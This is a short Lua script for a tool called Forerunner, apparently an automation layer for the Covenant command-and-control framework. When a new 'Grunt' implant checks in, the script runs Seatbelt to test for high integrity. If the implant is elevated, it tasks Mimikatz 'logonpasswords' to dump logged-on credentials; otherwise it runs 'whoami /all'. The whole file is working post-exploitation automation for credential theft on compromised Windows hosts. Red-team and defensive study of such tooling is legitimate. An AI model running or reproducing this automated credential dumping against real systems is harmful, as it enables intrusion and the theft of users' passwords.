function OnGruntInitial()
	--Forerunner passes the Grunt object to the script and can be accessed like so:
	print ('New Grunt Received with Name: ' .. gruntName)
	
	--Run Seatbelt
	response = GruntExec(gruntName,'SeatBelt system')
	
	--Check Seatbelt to determine if Grunt is in High Integrity Context
	print('[LUA] Checking Seatbelt Output:')
	if string.match(response, "HighIntegrity                 :  True") then
		print ('Returned Grunt is High Integrity.')
		print ('Tasking Mimikatz LogonPasswords to Grunt.')
		response = (GruntExec(gruntName,'logonpasswords'))
		print (response)
	else
		print ('Returned Grunt is Medium Integrity')
		print (GruntExec(gruntName,'shellcmd whoami /all'))
	end	
end

function OnGlobalOutput(commandOutput)
	print(commandOutput)
end
